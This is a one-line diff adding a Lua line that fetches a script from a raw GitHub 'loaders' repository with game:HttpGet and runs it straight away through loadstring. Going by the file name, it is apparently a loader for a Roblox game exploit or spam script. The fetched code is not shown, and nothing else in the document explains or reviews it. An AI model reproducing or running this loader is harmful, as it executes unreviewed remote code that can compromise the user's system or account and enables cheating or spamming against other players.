@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/hush-they-can-hear-beta-spam3-3bxt2brno3f1kv.lua"))()
